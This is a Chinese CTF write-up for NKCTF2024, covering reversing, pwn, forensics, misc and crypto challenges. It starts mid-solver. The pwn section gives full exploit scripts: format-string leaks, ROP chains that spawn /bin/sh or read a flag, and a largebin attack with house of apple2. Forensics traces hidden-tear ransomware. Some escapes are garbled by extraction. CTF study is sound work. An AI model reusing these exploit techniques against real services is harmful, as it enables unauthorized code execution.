(-105 * (39 * (2 * (v31 & v30) + (v31 ^ v30)) + 23) + 111))        + (v43 ^ (-105 * (39 * (2 * (v31 & v30) + (v31 ^ v30)) + 23) + 111)))       + 23)+ 111v42 = -105 * (39 * (2 * ((v28 ^ 0x17) & v42) + (v28 ^ 0x17 ^ v42)) + 23) + 111v41 = -105* (39       * (2        * (v41 & (-105                * (39                 * (2 * (v25 & (-105 * (39 * (2 * (v36 & 0xFB) + (v36 ^ 0xFB)) + 23) + 111))                  + (v25 ^ (-105 * (39 * (2 * (v36 & 0xFB) + (v36 ^ 0xFB)) + 23) + 111)))                 + 23)                + 111))        + (v41 ^ (-105                * (39                 * (2 * (v25 & (-105 * (39 * (2 * (v36 & 0xFB) + (v36 ^ 0xFB)) + 23) + 111))                  + (v25 ^ (-105 * (39 * (2 * (v36 & 0xFB) + (v36 ^ 0xFB)) + 23) + 111)))                 + 23)                + 111)))       + 23)+ 111v40 = -105 * (39 * (2 * (v40 & (~v22 + v24 + 1)) + (v40 ^ (~v22 + v24 + 1))) + 23) + 111v39 = -105* (39       * (2 * (v39 & (-105 * (39 * (2 * (v37 & v38) + (v37 ^ v38)) + 23) + 111))        + (v39 ^ (-105 * (39 * (2 * (v37 & v38) + (v37 ^ v38)) + 23) + 111)))       + 23)+ 111v38 = -105* (39       * (2 * (v38 & (-105 * (39 * (2 * ((~v25 + v22 + 1) & 0x11) + ((~v25 + v22 + 1) ^ 0x11)) + 23) + 111))        + (v38 ^ (-105 * (39 * (2 * ((~v25 + v22 + 1) & 0x11) + ((~v25 + v22 + 1) ^ 0x11)) + 23) + 111)))       + 23)+ 111v37 = -105* (39       * (2 * (v37 & (v26 ^ (-105 * (39 * (2 * (v27 & 1) + (v27 ^ 1)) + 23) + 111)))        + (v37 ^ v26 ^ (-105 * (39 * (2 * (v27 & 1) + (v27 ^ 1)) + 23) + 111)))       + 23)+ 111v36 = ~v29 + -105 * (39 * (2 * (v28 & v36) + (v28 ^ v36)) + 23) + 111 + 1v35 = -105* (39       * (2 * (v35 & (-105 * (39 * (2 * (v31 & v30) + (v31 ^ v30)) + 23) + 111))        + (v35 ^ (-105 * (39 * (2 * (v31 & v30) + (v31 ^ v30)) + 23) + 111)))       + 23)+ 111v34 = -105* (39       * (2        * (v33 & (-105                * (39                 * (2 * (v32 & (-105 * (39 * (2 * (v34 & 0xF9) + (v34 ^ 0xF9)) + 23) + 111))                  + (v32 ^ (-105 * (39 * (2 * (v34 & 0xF9) + (v34 ^ 0xF9)) + 23) + 111)))                 + 23)                + 111))        + (v33 ^ (-105                * (39                 * (2 * (v32 & (-105 * (39 * (2 * (v34 & 0xF9) + (v34 ^ 0xF9)) + 23) + 111))                  + (v32 ^ (-105 * (39 * (2 * (v34 & 0xF9) + (v34 ^ 0xF9)) + 23) + 111)))                 + 23)                + 111)))       + 23)+ 111v33 = -105 * (39 * (2 * (v33 & v34) + (v33 ^ v34)) + 23) + 111v32 = -105 * (39 * (2 * (v32 & (v38 ^ v37)) + (v32 ^ v38 ^ v37)) + 23) + 111v31 = -105* (39       * (2        * (v40 & (-105                * (39                 * (2 * (v41 & (-105 * (39 * (2 * (v31 & 0xC) + (v31 ^ 0xC)) + 23) + 111))                  + (v41 ^ (-105 * (39 * (2 * (v31 & 0xC) + (v31 ^ 0xC)) + 23) + 111)))                 + 23)                + 111))        + (v40 ^ (-105                * (39                 * (2 * (v41 & (-105 * (39 * (2 * (v31 & 0xC) + (v31 ^ 0xC)) + 23) + 111))                  + (v41 ^ (-105 * (39 * (2 * (v31 & 0xC) + (v31 ^ 0xC)) + 23) + 111)))                 + 23)                + 111)))       + 23)+ 111v30 = -105* (39       * (2 * (v42 & (-105 * (39 * (2 * (v30 & 8) + (v30 ^ 8)) + 23) + 111))        + (v42 ^ (-105 * (39 * (2 * (v30 & 8) + (v30 ^ 8)) + 23) + 111)))       + 23)+ 111v29 = -105 * (39 * (2 * ((v43 ^ 0x4D) & v29) + (v43 ^ 0x4D ^ v29)) + 23) + 111v28 = -105* (39       * (2 * (v28 & (-105 * (39 * (2 * ((v44 ^ 0x17) & 0xF9) + (v44 ^ 0xEE)) + 23) + 111))        + (v28 ^ (-105 * (39 * (2 * ((v44 ^ 0x17) & 0xF9) + (v44 ^ 0xEE)) + 23) + 111)))       + 23)+ 111v27 = -105 * (39 * (2 * ((v28 ^ v30) & v27) + (v28 ^ v30 ^ v27)) + 23) + 111v26 = -105* (39       * (2 * (v33 & (-105 * (39 * (2 * (v31 & v26) + (v31 ^ v26)) + 23) + 111))        + (v33 ^ (-105 * (39 * (2 * (v31 & v26) + (v31 ^ v26)) + 23) + 111)))       + 23)+ 111v25 = -105 * (39 * (2 * (v25 & v34) + (v25 ^ v34)) + 23) + 111v24 = -105* (39       * (2 * (v37 & (-105 * (39 * (2 * (v24 & v39) + (v24 ^ v39)) + 23) + 111))        + (v37 ^ (-105 * (39 * (2 * (v24 & v39) + (v24 ^ v39)) + 23) + 111)))       + 23)+ 111v23 = -105 * (39 * (2 * (v40 & v23) + (v40 ^ v23)) + 23) + 111v22 = -105 * (39 * (2 * ((v45 ^ v43) & v22) + (v45 ^ v43 ^ v22)) + 23) + 111v21 = -105* (39       * (2 * (v21 & (-105 * (39 * (2 * (v44 & 0x18) + (v44 ^ 0x18)) + 23) + 111))        + (v21 ^ (-105 * (39 * (2 * (v44 & 0x18) + (v44 ^ 0x18)) + 23) + 111)))       + 23)+ 111v20[0]=v45v20[1]=v44v20[2]=v43v20[3]=v42v20[4]=v41v20[5]=v40v20[6]=v39v20[7]=v38v20[8]=v37v20[9]=v36v20[10]=v35v20[11]=v34v20[12]=v33v20[13]=v32v20[14]=v31v20[15]=v30v20[16]=v29v20[17]=v28v20[18]=v27v20[19]=v26v20[20]=v25v20[21]=v24v20[22]=v23v20[23]=v22v20[24]=v21for i in range(25):    v20[i]&=0xff
nv20=[0]*25dword=[0x00000000, 0xFFFFFFFE, 0xFFFFFFFF, 0x00000004, 0x00000001, 0xFFFFFFFF, 0x00000001, 0x00000000, 0x00000000, 0xFFFFFFFF, 0xFFFFFFFD, 0xFFFFFFFE, 0x00000000, 0xFFFFFFF6, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFE, 0x00000001, 0xFFFFFFF3, 0xFFFFFFFF, 0xFFFFFFFA, 0xFFFFFFFF, 0xFFFFFFFE, 0x00000001, 0xFFFFFFFE, 0x00000000, 0x00000000, 0x00000000]for i in range(5):    for j in range(5):        v13 = 0        for k in range(5):            v3=((dword[5*i+k])*v20[5*k+j])&0xff            v9 = (-105 * (39 * (2 * (v13 & v3) + (v13 ^ v3)) + 23) + 111)&0xff            v13 = v9        nv20[5*i+j]=v13enc=[118, 116, 245, 47, 83, 72, 116, 69, 164, 95, 252, 99, 1, 208, 248, 170, 121, 70, 17, 126, 29, 145, 126, 142, 202]for i in range(25):    x.add(nv20[i]==enc[i])if x.check() == sat:    model = x.model()    print(model)# NKCTF{THut_1Ss_s@_eAsyhh}

EZNative

用blutter的addNames.py和bindiff恢复符号表

容易看出是xxtea加密

一步一步跟汇编发现超过8字节没有溢出

根据提示搜索xxtea dart

printf("hello world!");

PWN

Maimai查分器

选择1随便输几个大数字就能进入溢出函数了，无限循环的格式化字符串泄露出stack、canary、libc然后打orw即可，由于长度不够所以分三次输入分别orw

exp:

from pwn import*context(log_level='debug',arch='amd64', os='linux')
io = remote("node.nkctf.yuzhian.com.cn",31370)
libc = ELF('./libc.so.6')

elf = ELF('./pwn')
io.sendlineafter("option:n",'1')io.recvuntil('rank.n')for i in range(50):  io.sendline('20.0 SSS+')io.sendlineafter("option:n",'2')
io.sendafter("nickname.n",'%7$p%9$p')canary = int(io.recv(18),16)adr = int(io.recv(14),16)-0x1b25io.sendlineafter("maimai?n",'a')io.sendlineafter("option:n",'2')io.sendafter("nickname.n",'%13$p')libc_base = int(io.recv(14),16)-0x29d90pop_rdi = libc_base + next(libc.search(asm('pop rdi;ret;')))pop_rsi = libc_base + next(libc.search(asm('pop rsi;ret;')))pop_rdx = libc_base + next(libc.search(asm('pop rdx;pop r12;ret;')))r12 =  libc_base + next(libc.search(asm('pop r12;ret;')))leave_ret = libc_base + next(libc.search(asm('leave;ret;')))open_addr=libc.symbols['open']+libc_baseread_addr=libc.symbols['read']+libc_basewrite_addr=libc.symbols['write']+libc_baseputs_addr=libc.symbols['puts']+libc_basemain = adr+0x1984 io.sendlineafter("maimai?n",'a')io.sendlineafter("option:n",'2')io.sendafter("nickname.n",'%8$p')stack = int(io.recv(14),16)-0x30-0x40print(hex(canary))print(hex(adr))print(hex(libc_base))print(hex(stack))
io.sendafter("maimai?n",b'./flagx00'.ljust(0x28,b'a')+p64(canary)+p64(0)+p64(pop_rdi)+p64(stack)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(0)+p64(open_addr)+p64(main))sleep(0.1)io.sendafter("maimai?n",b'./flagx00'.ljust(0x28,b'a')+p64(canary)+p64(0)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(adr+elf.bss()+0x200)+p64(pop_rdx)+p64(0x30)+p64(0)+p64(read_addr)+p64(main))sleep(0.1)io.sendafter("maimai?n",b'./flagx00'.ljust(0x28,b'a')+p64(canary)+p64(0)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(adr+elf.bss()+0x200)+p64(pop_rdx)+p64(0x30)+p64(0)+p64(write_addr)+p64(main))
io.interactive()

来签个到

有格式化字符串，可以泄露libc和canary

然后ret2dll即可

exp：

from pwn import * 
context.log_level='debug'context.arch='i386'p = remote("123.60.25.223", 10001)puts_plt = 0x403F94puts_got = 0x40922Cmain = 0x40145Ep.sendlineafter("NKCTF2024rn","%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p%p%p")p.recvuntil('.')p.recvuntil('.')addr1 = int(p.recv(8),16)p.recvuntil('.')addr2 = int(p.recv(8),16)p.recvuntil('.')addr3 = int(p.recv(8),16)p.recvuntil('00702570.')can = int(p.recv(8),16)p.recvuntil('004012D0')print(hex(addr1))print(hex(addr2))print(hex(addr3))print(hex(can))print(hex(stack))base = addr3-0x101b7640system = base+0x10144700cmd_adr = base+0x101048C8print(hex(base))payload = b'a'*0x64+p64(can)+p32(0)*2+p32(system)+p32(main)+p32(cmd_adr)p.sendlineafter("ohhh,no",payload)
p.interactive()

leak

溢出1字节可以控制栈内容，可以写返回地址，libc的话用的maimai那题，本地远程情况一样

stdout可以通过中国剩余定理计算得到，不过6组数据得到的结果太小了，多执行一次得到12组数据就可以计算出来，得到libc打rop就可以

from pwn import *  from LibcSearcher import *from sympy.ntheory.modular import solve_congruence  context(log_level='debug',os='linux',arch='amd64')pwnfile = './leak'#io=process(pwnfile)io=remote('node.nkctf.yuzhian.com.cn',33977)    
def debug():    gdb.attach(io)    pause()
io.recvuntil("I'll tell you a secret")pay = b'x61x59x53x4fx47x43'
io.send(pay)io.recvline()
sleep(0.1)re0 = hex(int.from_bytes(io.recv(1)))sleep(0.1)re1 = hex(int.from_bytes(io.recv(1)))sleep(0.1)re2 = hex(int.from_bytes(io.recv(1)))sleep(0.1)re3 = hex(int.from_bytes(io.recv(1)))sleep(0.1)re4 = hex(int.from_bytes(io.recv(1)))sleep(0.1)re5 = hex(int.from_bytes(io.recv(1)))print(b"re0"+b"  ",re0)print(b"re1"+b"  ",re1)print(b"re2"+b"  ",re2)print(b"re3"+b"  ",re3)print(b"re4"+b"  ",re4)print(b"re5"+b"  ",re5)

buf = u8(io.recvn(1))  # buf 低字节print("buf---->"+str(buf))  #debug()pay = b'x89'*8+b'b'*8+b'c'*8+b'd'*8+p8(buf+0x39)io.send(pay)

io.recvuntil("I'll tell you a secret")pay = b'x3dx3bx37x31x2fx29'io.send(pay)io.recvline()
sleep(0.1)re6 = hex(int.from_bytes(io.recv(1)))sleep(0.1)re7 = hex(int.from_bytes(io.recv(1)))sleep(0.1)re8 = hex(int.from_bytes(io.recv(1)))sleep(0.1)re9 = hex(int.from_bytes(io.recv(1)))sleep(0.1)rea = hex(int.from_bytes(io.recv(1)))sleep(0.1)reb = hex(int.from_bytes(io.recv(1)))print(b"re6"+b"  ",re6)print(b"re7"+b"  ",re7)print(b"re8"+b"  ",re8)print(b"re9"+b"  ",re9)print(b"rea"+b"  ",rea)print(b"reb"+b"  ",reb)
congruences = [    (int(re0,16), 0x61),    (int(re1,16), 0x59),    (int(re2,16), 0x53),    (int(re3,16), 0x4f),    (int(re4,16), 0x47),    (int(re5,16), 0x43),    (int(re6,16), 0x3d),    (int(re7,16), 0x3b),    (int(re8,16), 0x37),    (int(re9,16), 0x31),    (int(rea,16),0x2f),    (int(reb,16),0x29),]
solutions = solve_congruence(*congruences)
for solution in solutions:    print("x 的值:", hex(solution))
x, _ = solve_congruence(*congruences)stdout = int(x)print("stdout--->",hex(stdout))
libc = ELF("/home/kali/Desktop/glibc-all-in-one/libs/2.35-0ubuntu3.6_amd64/libc.so.6")libc_base = stdout-libc.sym['_IO_2_1_stdout_']bin_sh = libc_base + libc.search(b'/bin/sh').__next__() sys_adr = libc_base + libc.sym['system']pop_rdi = libc_base + 0x000000000002a3e5ret = libc_base + 0x0000000000029139
print("libc_base--->",hex(libc_base))#debug()
pay = p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_adr)+p8(buf+0x48+0x10)io.send(pay)
io.interactive()

幻兽帕鲁

bleedpallu 函数可以根据已有堆块大小生成新的堆块大小，应该就是题目描述的杂交。

同时可以自己输入name，能够泄露堆地址。

整体思路就是：

不断的利用bleedpallu 函数杂交出符合大小的堆块，这里目的是构造出larginbin范围内0x940-0x970大小的堆块

(0x2000 + 0x500) / 2 = 0x1280(0x1280 + 0x930) / 2 = 0xdd8(0xdd8 + 0x500) / 2 = 0x96c(0x96c + 0x930) / 2 = 0x94e

最后执行larginbin attack覆盖_IO_list_all，直接house of apple打io即可。

最终exp如下：

from pwn import *import warnings
warnings.filterwarnings("ignore", category=BytesWarning)
context.arch = 'amd64'context.log_level = 'debug'
fn = './pallu'elf = ELF(fn)libc = ELF('./libc-2.23.so')
debug = 1if debug: p = process(fn)else: p = remote('node.nkctf.yuzhian.com.cn', 33889)
def dbg(s=''): if debug: gdb.attach(p, s) pause()
 else: pass
lg = lambda x, y: log.success(f'{x}: {hex(y)}')
 def menu(index): p.sendlineafter('Your choice:', str(index))

def add(index): menu(1) p.sendlineafter('pallu index:', str(index))

def edit(index, desc): menu(2) p.sendlineafter('pallu index:', str(index)) p.sendafter('input Labels:', desc)

def show(index): menu(3) p.sendlineafter('pallu index:', str(index))

def bleed(id1, id2, name): menu(4) p.sendlineafter('pallu index:', str(id1)) p.sendlineafter('pallu index:', str(id2)) p.sendlineafter('set name by yourself?(y/n)', 'y') p.send(name)

def delete(index): menu(5) p.sendlineafter('pallu index:', str(index))

def show2all(): menu(6)

def gift(): menu(8) p.recvuntil('Enter the git code:') p.sendline('Happy NKCTF2024!')

def house_of_apple2(fake_IO_file_addr): fake_IO_file = flat( { 0x18: 1, # _IO_write_ptr 0x58: one_gadget, # chain 0x78: _IO_stdfile_2_lock, # _lock 0x90: fake_IO_file_addr + 0x20, # _IO_wide_data 0xc8: _IO_wfile_jumps, # vtable 0x140: fake_IO_file_addr + 0x100, # fake wide vtable 0x158: one_gadget }, filler='x00' ) return fake_IO_file

add(2)add(2)bleed(0, 1, 'a' * 0x10)
show2all()p.recvuntil('a' * 0x10)heapbase = u64(p.recv(6).ljust(8, b'x00')) - 0x1290lg('heapbase', heapbase)
delete(0)delete(1)delete(2)
add(0)add(1)bleed(0, 1, 'aaaan') # -> 2
add(2)delete(0)bleed(2, 3, 'bbbbn') # -> 0
delete(2)bleed(0, 1, 'ccccn') # -> 2
delete(3)add(1)delete(3)delete(1)add(2)delete(0)
gift()p.recvuntil('Happy NKCTF2024!n')leak = (u64(p.recv(5).ljust(8, b'x00')) << 8) | 0xe0lg('leak', leak)libc_base = leak - 0x3c38e0lg('libc_base', libc_base)
free_hook = libc_base + libc.sym['__free_hook']system = libc_base + libc.sym['system']_IO_list_all = libc_base + 0x3c4520_IO_stdfile_2_lock = libc_base + 0x3c5790_IO_wfile_jumps = libc_base + 0x3c2260
gadgets = [0x45206, 0x4525a, 0xef9f4, 0xf0897]one_gadget = libc_base + gadgets[1]
bleed(1, 2, 'ddddn') # -> 3
delete(1)delete(2)
add(2)add(2)delete(3)add(0)
payload = b'a' * 0x200 + p64(0) + p64(0x951)payload += p64(libc_base + 0x3c40b8) * 2 + p64(heapbase + 0x210) + p64(_IO_list_all - 0x20)edit(0, payload)
payload = house_of_apple2(heapbase + 0x14a0)edit(2, payload)delete(2)add(0)
# dbg()
menu(9)
p.interactive()

Forensics

cain_is_hacker

附件一个内存文件，直接vol看

pslist发现便签，dump出来挨个看找到一段base

Cute cain reminds you that you may use the following key welcome_to_NkCTF_and_this_is_the_enkey

利用刚刚的key和配置文件export一个xlsx

发现存在VB宏，手搓搞出来源码

Function Base64Decode(ByVal base64String As String) As String    Dim base64Decoded As Object    Dim base64 As Object    Set base64 = CreateObject("MSXML2.DOMDocument")    Set base64Decoded = CreateObject("MSXML2.DOMDocument")        If Not base64 Is Nothing And Not base64Decoded Is Nothing Then        base64.DataType = "bin.base64"        base64Decoded.DataType = "bin.base64"                base64Decoded.LoadXML base64String        Base64Decode = base64Decoded.NodeTypedValue    Else        Base64Decode = ""    End IfEnd Function
Sub DecodeBase64()    Dim base64String As String    Dim decodedString As String        base64String = "Q0IgRkMgM0IgRDUgM0QgRTkgQ0IgMjkgQzQgMTAgQ0EgM0QgOUQgREIgRjEgQTQNCkJEIEY4IDUzIDQyIDgwIERDIDkzIDUwIDA0IEM1IDhGIDA5IEREIEJFIDc0IEMzDQo5QiAzNCA0QyA3MSAwMyAwRiBBNCBFNCBGQSBFOCAwNiA5OCA2NCBGMSAxNSBDOA0KMTcgOTIgRTkgOEUgQjggM0EgQzcgQjMgRTIgRjAgMUIgQTUgNjggMzQgQzkgM0MNCjA3IDQ2IDYwIEZBIDc1IEZCIDFBIDBDIDUwIDNDIEU5IEFFIEEzIDdGIDlEIERFDQowQiBERiBBOCAzQyA4NyBEMSBGNiA5QyA0OSA3RCBGRiBBQyBCQSBFRiBFNiAzMQ=="        decodedString = Base64Decode(base64String)
End Sub

就是简单的base64，base64得到一段hex

当时以为是类似aes之类的，找key了

之后继续用vol梭，利用mftparser,发现一个可疑的东西

key:nT0*XoHBA2!Uc?

之后发现不是AES，结合题目描述，有可能是勒索病毒

继续翻，看一下temp

发现一个hidden-tear.exe

github:goliate/hidden-tear: ransomware open-sources (github.com)

发现是勒索软件，下载后将刚刚那个16进制转为文件之后改后缀，之后解密即可

NKCTF{C0ngr@tu1atiOns_On_coMpleting_t3e_Fo3eNs1cs_Ch41lenge_I_wi1l_giv4_y0u_A_cain!!!!}

Misc

Minecraft:SEED

world.execute.me

readme里写到，机器人会把QUESTION：后面的识别成问题，其余的部分都识别为答案

那么我们只需新建issue

机器人会吐出flag：

NKCTF2024{Then_1_c4n_b3_y0ur_only_EXECUTION}

ctf80

#/*<?php eval('echo "tanjin";'); __halt_compiler();?> */

#include <stdio.h> /*print ((("b" + "0" == 0) and eval('""')) or (0 and 'Randark_JMT' or "rec"));__DATA__ = 1"""""__END__===== . ===== */#ifdef __cplusplus char msg[5] = {'C','a','i','n','n'};#else char msg[9] = {'c','r','a','z','y','m','a','n','n'};#endif
int main() { int i; for(i = 0; i < 8; ++i) putchar(msg[i]); return 0;} /*"""#*/

signin

Webshell_pro

解出来是个python加密的脚本

写个解密脚本

import base64from urllib.parse import unquoteimport libnumfrom Crypto.PublicKey import RSA
pubkey = """-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCK/qv5P8ixWjoFI2rzF62tm6sDFnRsKsGhVSCuxQIxuehMWQLmv6TPxyTQPefIKufzfUFaca/YHkIVIC19ohmE5X738TtxGbOgiGef4bvd9sU6M42k8vMlCPJp1woDFDOFoBQpr4YzH4ZTR6Ps+HP8VEIJMG5uiLQOLxdKdxi41QIDAQAB-----END PUBLIC KEY-----"""
prikey = """-----BEGIN PRIVATE KEY-----MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAIr+q/k/yLFaOgUjavMXra2bqwMWdGwqwaFVIK7FAjG56ExZAua/pM/HJNA958gq5/N9QVpxr9geQhUgLX2iGYTlfvfxO3EZs6CIZ5/hu932xTozjaTy8yUI8mnXCgMUM4WgFCmvhjMfhlNHo+z4c/xUQgkwbm6ItA4vF0p3GLjVAgMBAAECgYBDsqawT5DAUOHRft6oZ+//jsJMTrOFu41ztrKkbPAUqCesh+4R1WXAjY4wnvY1WDCBN5CNLLIo4RPuli2R81HZ4OpZuiHv81sNMccauhrJrioDdbxhxbM7/jQ6M9YajwdNisL5zClXCOs1/y01+9vDiMDk0kX8hiIYlpPKDwjqQQJBAL6Y0fuoJng57GGhdwvN2c656tLDPj9GRi0sfeeMqavRTMz6/qea1LdAuzDhRoS2Wb8ArhOkYns0GMazzc1q428CQQC6sM9OiVR4EV/ewGnBnF+0p3alcYr//Gp1wZ6fKIrFJQpbHTzf27AhKgOJ1qB6A7P/mQS6JvYDPsgrVkPLRnX7AkEAr/xpfyXfB4nsUqWFR3f2UiRmx98RfdlEePeo9YFzNTvX3zkuo9GZ8e8qKNMJiwbYzT0yft59NGeBLQ/eynqUrwJAE6Nxy0Mq/Y5mVVpMRa+babeMBY9SHeeBk22QsBFlt6NT2Y3Tz4CeoH547NEFBJDLKIICO0rJ6kF6cQScERASbQJAZy088sVY6DJtGRLPuysv3NiyfEvikmczCEkDPex4shvFLddwNUlmhzml5pscIie44mBOJ0uX37y+co3q6UoRQg==-----END PRIVATE KEY-----"""
pubkey = RSA.import_key(pubkey)prikey = RSA.import_key(prikey)n = pubkey.n
def enc_replace(base64_str: str):    base64_str = base64_str.replace("/", "e5Lg^FM5EQYe5!yF&62%V$UG*B*RfQeM")    base64_str = base64_str.replace("+", "n6&B8G6nE@2tt4UR6h3QBt*5&C&pVu8W")    return base64_str.replace("=", "JXWUDuLUgwRLKD9fD6&VY2aFeE&r@Ff2")
def encrypt(plain_text):    # 私钥加密    cipher_text = b""    for i in range(0, len(plain_text), 128):        part = plain_text[i:i+128]        enc = libnum.n2s(pow(libnum.s2n(part), prikey.d, n))        cipher_text += enc    return enc_replace(base64.b64encode(cipher_text).decode())
def decrypt(cipher_text):    cipher_text=unquote(cipher_text)    # 恢复原始字符    cipher_text = cipher_text.replace("JXWUDuLUgwRLKD9fD6&VY2aFeE&r@Ff2", "=")    cipher_text = cipher_text.replace("n6&B8G6nE@2tt4UR6h3QBt*5&C&pVu8W", "+")    cipher_text = cipher_text.replace("e5Lg^FM5EQYe5!yF&62%V$UG*B*RfQeM", "/")
    # 对Base64编码的密文进行解码并进行替换操作    cipher_text = base64.b64decode(cipher_text)
    # 使用公钥解密    plain_text = b""    for i in range(0, len(cipher_text), 128):        part = cipher_text[i:i+128]        dec = libnum.n2s(pow(libnum.s2n(part), pubkey.e, n))        plain_text += dec    return plain_text
if __name__ == '__main__':
    c = "G1TUg4bIVOFYi8omV2SQrTa8fzYfboRNN7fV6FJn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8Wbm3O74uCUbwMkvRCYae44TX1ZO8X4w2Nk1igaIZjSQIJ9MMHhD9cn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WSV5EzikNsyM5c1nlPS8uqw1P2pJuYLaLxloK0x5xhQHDqqAxkuKrBzPn0noQ2bDn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WlVnGwsfP7YP9PYJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2"    print(f"加密数据: {c}")
    decrypted_text = decrypt(c)    print(f"解密数据: {decrypted_text}")    with open("dec.data", "wb") as f:        f.write(decrypted_text)

Crypto

ez_math

from Crypto.Util.number import *from secret import flag
m1, m2 = bytes_to_long(flag[:len(flag)//2]), bytes_to_long(flag[len(flag)//2:])p, q, r, s = [getStrongPrime(512) for _ in range(4)]e = 0x10001
n = p * q * r * sx = pow(q + r, p, n)y = pow(p * q + r, p, n)z = pow(s + 1, m1, s ** 3)c = pow(m2, e * (s - 1), n)
print(f'{n = }')print(f'{x = }')print(f'{y = }')print(f'{z = }')print(f'{c = }')
# n = 16063619267258988011034805988633616492558472337115259037200126862563048933118401979462064790962157697989038876156970157178132518189429914950166878537819575544418107719419007799951815657212334175336430766777427972314839713871744747439745897638084891777417411340564312381163685003204182743581513722530953822420925665928135283753941119399766754107671729392716849464530701015719632309411962242638805053491529098780122555818774774959577492378249768503656934696409965037843388835948033129997732058133842695370074265039977902884020467413323500218577769082193651281154702147769044514475692164145099161948955990463002411473013# x = 3021730035236300354492366560252387204933590210661279960796549263827016146230329262559940840168033978439210301546282150367717272453598367244078695402717500358042032604007007155898199149948267938948641512214616076878271433754986480186150178487625316601499002827958344941689933374158456614113935145081427421623647242719093642478556263121508238995676370877385638074444859047640771188280945186355013165130171802867101829647797879344213688981448535289683363612035513789240264618036062440178755665951650666056478493289870170026121826588708849844053588998886259091357236645819074078054595561158630194224419831088510266212458# y = 8995787142441643101775260550632842535051686960331455373408888374295557050896156890779515089927839904014859222004906681231525326673182671984194300730575609496770604394218160422560576866112460837985407931067753009696969997384839637927957848613356269534870170452152926447601781637641134982178028922559652443398183848786034348994249923007092159192374765197460466878587635412657807328348343062302127490267456095927890461140420639805398464266081441243108883599713672104446500850203779995739675784794478089863001309614674686652597236324659979849324914804032046113978246674538411441434320732570934185579553749616238819583998# z = 1283646988194723153191718393109711130382429329041718186548715246082834666179475883560020086589684603980734305610989683434078096863563033623169666389076830792095374856743015929373461198718962686411467443788047511292138922700655772772117855226419561159782734009961921473456332468653898105909729309377890721920937410781006337057478451806364879679045839945032594716202888196404203782734864187890231653321470085251# c = 4988583141177813116287729619098477713529507701428689219486720439476625736884177254107631282807612305211904876847916760967188201601494592359879509876201418493870112712105543214178376471651715703062382025712952561985261461883133695993952914519494709871429166239968478488380137336776740647671348901626710334330855078254188539448122493675463406596681080368929986034772169421577420193671300532508625180845417164660544286332963072804192276425664877337357353975758574262657585309762422727680851018467657523970318042829660721433987195369353660020476598195375492128671951807024027929490113371463210453342974983253996717176870

z和c联立求得s和m1

通过调试，kp里的k是q的倍数，x-y和n进行GCD得到q

然后x-y-q与n进行GCD得到p

r=n//(pqs)

所有因子求出来，e和phi有公因子4

开方

from Crypto.Util.number import *import gmpy2
n = 16063619267258988011034805988633616492558472337115259037200126862563048933118401979462064790962157697989038876156970157178132518189429914950166878537819575544418107719419007799951815657212334175336430766777427972314839713871744747439745897638084891777417411340564312381163685003204182743581513722530953822420925665928135283753941119399766754107671729392716849464530701015719632309411962242638805053491529098780122555818774774959577492378249768503656934696409965037843388835948033129997732058133842695370074265039977902884020467413323500218577769082193651281154702147769044514475692164145099161948955990463002411473013x = 3021730035236300354492366560252387204933590210661279960796549263827016146230329262559940840168033978439210301546282150367717272453598367244078695402717500358042032604007007155898199149948267938948641512214616076878271433754986480186150178487625316601499002827958344941689933374158456614113935145081427421623647242719093642478556263121508238995676370877385638074444859047640771188280945186355013165130171802867101829647797879344213688981448535289683363612035513789240264618036062440178755665951650666056478493289870170026121826588708849844053588998886259091357236645819074078054595561158630194224419831088510266212458y = 8995787142441643101775260550632842535051686960331455373408888374295557050896156890779515089927839904014859222004906681231525326673182671984194300730575609496770604394218160422560576866112460837985407931067753009696969997384839637927957848613356269534870170452152926447601781637641134982178028922559652443398183848786034348994249923007092159192374765197460466878587635412657807328348343062302127490267456095927890461140420639805398464266081441243108883599713672104446500850203779995739675784794478089863001309614674686652597236324659979849324914804032046113978246674538411441434320732570934185579553749616238819583998z = 1283646988194723153191718393109711130382429329041718186548715246082834666179475883560020086589684603980734305610989683434078096863563033623169666389076830792095374856743015929373461198718962686411467443788047511292138922700655772772117855226419561159782734009961921473456332468653898105909729309377890721920937410781006337057478451806364879679045839945032594716202888196404203782734864187890231653321470085251c = 4988583141177813116287729619098477713529507701428689219486720439476625736884177254107631282807612305211904876847916760967188201601494592359879509876201418493870112712105543214178376471651715703062382025712952561985261461883133695993952914519494709871429166239968478488380137336776740647671348901626710334330855078254188539448122493675463406596681080368929986034772169421577420193671300532508625180845417164660544286332963072804192276425664877337357353975758574262657585309762422727680851018467657523970318042829660721433987195369353660020476598195375492128671951807024027929490113371463210453342974983253996717176870e = 0x10001
s = GCD(c - 1, n)m1 = ((z - 1) // s) % sm1 = long_to_bytes(m1)r3 = y ** 3 % (n // s)q = GCD(x - y, n)p = GCD(x-y-q, n//q)r = n//(p*q*s)phi = (q - 1)*(p - 1)*(r-1)d = gmpy2.invert((e * (s - 1)) // 4, phi)c_pqr = c % (p*q*r)m2 = pow(c, d, p*q*r)m2 = gmpy2.iroot(m2, 4)m2 = long_to_bytes(m2[0])print(m1+m2)# b'nkctf{cb5b7392-cca4-4ce2-87e7-930cf6b29959}'

GGH

from sage.all import *from flag import flag,n,deltadef hadamard_ratio(basis):    dimension = basis.nrows()    det_Lattice = det(basis)    mult=1.0    for v in basis:        mult *= float(v.norm(2))    hratio = (det_Lattice / mult) ** (1/dimension)    return hratiodef get_key(n):    l = 7    k = ceil(sqrt(n) + 1) * l    I = identity_matrix(n)    while 1:        V_ = random_matrix(ZZ,n, n, x=-l, y=l)        V = V_ + I*k        hada_ratio = hadamard_ratio(V)        if hada_ratio > 0.86:            U = unimodular_matrix(n)            W = V * U            return V, W        else:            continue
